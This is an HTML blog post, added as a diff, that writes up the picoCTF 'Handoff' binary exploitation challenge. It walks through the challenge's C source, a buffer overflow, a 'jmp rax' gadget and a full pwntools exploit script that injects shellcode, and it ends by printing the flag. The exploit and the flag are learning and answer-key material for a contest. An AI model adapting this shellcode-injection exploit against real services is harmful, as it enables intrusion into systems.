@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>
+Handoff | 0x3nigma
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Your website description">
+
+<meta name="generator" content="Hugo 0.151.0">
+
+
+<link rel="canonical" href="http://localhost:1313/posts/picoctf_handoff/" >
+
+
+
+
+<link href="/css/style.min.66302fa6c122ab7804faa4bd6465554ac4d746c25294af622826d0445b79ab94.css" rel="stylesheet">
+
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a class="terminal" href="/">
+                <span>0x3nigma@localhost ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="http://localhost:1313/posts/" title="" >
+                        ~/posts</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:1313/about/" title="" >
+                        ~/about</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:1313/categories/" title="" >
+                        ~/categories</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>Handoff</h1>
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+
+    
+    <section class="postMetadata">
+        <dl>
+            
+            
+            
+                
+<dt>categories</dt>
+<dd><span></span>
+    <a href="/categories/picoctf/">Picoctf</a><span></span>
+    <a href="/categories/binary-exploitation/">Binary Exploitation</a></dd>
+            
+            
+                <dt>published</dt>
+                 
+                 
+                 <dd><time datetime="2025-12-16">2025-12-16</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>4 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <h4 id="analysis">Analysis:</h4>
+<p>In this challenge we are provided with the source code and the binary.</p>
+<h5 id="step-1">Step 1:</h5>
+<p>We will first check the protections with checksec:</p>
+<p><img src="/Images/checksec_handoff.png" alt="alt"></p>
+<p>From the above output we can see a few things:</p>
+<ol>
+<li>That the stack of the binary is executable</li>
+<li>There is no protection against buffer overflow since it lacks a stack canary.</li>
+</ol>
+<p>From the above observations we can infer that we can inject and execute a shellcode. Now lets look at the source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdbool.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_ENTRIES 10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define NAME_LEN 32
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MSG_LEN 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> entry {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> msg[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">entry_t</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_menu</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;What option would you like to do?&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;1. Add a new recipient&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;2. Send a message to a recipient&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;3. Exit the app&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vuln</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> feedback[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">entry_t</span> entries[<span style="color:#ae81ff">10</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> total_entries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> choice <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">while</span> (true) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">print_menu</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>choice) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">getchar</span>(); <span style="color:#75715e">// Remove trailing \n
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Add entry
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>			choice <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Check for max entries
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">if</span> (total_entries <span style="color:#f92672">&gt;=</span> MAX_ENTRIES) {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Max recipients reached!&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Add a new entry
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;What&#39;s the new recipient&#39;s name: &#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fflush</span>(stdin);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fgets</span>(entries[total_entries].name, NAME_LEN, stdin);
+</span></span><span style="display:flex;"><span>			total_entries<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Add message
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>			choice <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Which recipient would you like to send a message to?&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>choice) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">&gt;=</span> total_entries) {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invalid entry number&#34;</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;What message would you like to send them?&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fgets</span>(entries[choice].msg, MSG_LEN, stdin);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
+</span></span><span style="display:flex;"><span>			choice <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: &#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fgets</span>(feedback, NAME_LEN, stdin);
+</span></span><span style="display:flex;"><span>			feedback[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>			choice <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invalid option&#34;</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);  <span style="color:#75715e">// No buffering (immediate output)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">vuln</span>();
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Analysing the source code we can see that there is a buffer overflow vulnerability in choice number 3 , that is the <code>feedback</code> buffer and choice number 1 that is <code>name</code> buffer since both of them can hold only 8 bytes but <code>NAME_LEN</code> is 32 bytes.</p>
+<p>Now opening the binary in ghidra:</p>
+<p><img src="/Images/ghidra_handoff.png" alt="alt"></p>
+<p>we can see the name buffer is 0x2e8(744) bytes below return address and hence we can&rsquo;t use this buffer to overwrite the return address since we can insert only 32 bytes into this buffer. A much better alternative will be to use the feedback buffer which is 0x14(20) bytes below the return address and hence can be used to overwrite the return address.
+But since the feedback buffer can hold only 32 bytes and also has a null byte(<code>feedback[7]=0</code>) we can&rsquo;t use this buffer to insert our shellcode.</p>
+<p>Hence to insert our shellcode we will be using the msg buffer which can hold 64 bytes.
+Now using ROPgadget tool we tried to find a usable gadget for this shellcode execution. We found out a cool gadget :</p>
+<pre><code>0x0040116c : jmp rax
+</code></pre>
+<p>This gadget works since <code>fgets</code> function returns the address of the buffer in the <code>rax</code> register. Hence we can jump to the buffer in which we inserted our shellcode by using the above gadget.
+Now we can craft a suitable exploit for this binary.</p>
+<h3 id="exploitation">Exploitation:</h3>
+<h4 id="steps">Steps:</h4>
+<ol>
+<li>First we will create a recipient to whom we can send a message using option 1.</li>
+<li>We will then send him the main shellcode to spawn a shell which will be stored in the msg buffer using option 2.</li>
+<li>At last we will select the 3rd option to send him the feedback which will contain a stub shellcode that will make the instruction pointer move down to the msg buffer/main shellcode .</li>
+</ol>
+<p>We will also have to find the offset between the start of the feedback buffer and the start of the msg buffer so that we make the instruction pointer move to the main shellcode.</p>
+<h4 id="the-exploit-script">The exploit script</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;host&#34;</span>, type<span style="color:#f92672">=</span>str)
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;port&#34;</span>, type<span style="color:#f92672">=</span>int)
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./handoff&#34;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;info&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rip_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x14</span> 
+</span></span><span style="display:flex;"><span>msg_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2e0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Initial Shellcode that will jump to main shellcode:</span>
+</span></span><span style="display:flex;"><span>jmp_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040116c</span>
+</span></span><span style="display:flex;"><span>jmp_dist <span style="color:#f92672">=</span> msg_offset <span style="color:#f92672">-</span> rip_offset
+</span></span><span style="display:flex;"><span>stub_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                nop
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                nop
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                nop
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                sub rax, </span><span style="color:#e6db74">{</span>jmp_dist<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                jmp rax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>        stub_shellcode,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (rip_offset<span style="color:#f92672">-</span>len(stub_shellcode)),
+</span></span><span style="display:flex;"><span>        jmp_rax,
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Main shellcode:</span>
+</span></span><span style="display:flex;"><span>main_shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>amd64<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>cat(<span style="color:#e6db74">&#39;flag.txt&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creating the process:</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># First creating a reciepient to whom i can send the shellcode</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;Anon&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Then sending the main shellcode which will be placed in the msg buffer:</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(main_shellcode)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Then sending the stub shellcode that will make it jump to the main_shellcode:</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;3&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h4 id="running-the-exploit-script">Running the exploit script:</h4>
+<p>Running the command:</p>
+<pre><code>python3 exploit.py shape-facility.picoctf.net 59013
+</code></pre>
+<p>We get the flag:</p>
+<pre><code>picoCTF{p1v0ted_ftw_5b992d80}
+</code></pre>
+
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>
+            © 2025 0x3nigma, Built with
+            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
+        </span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
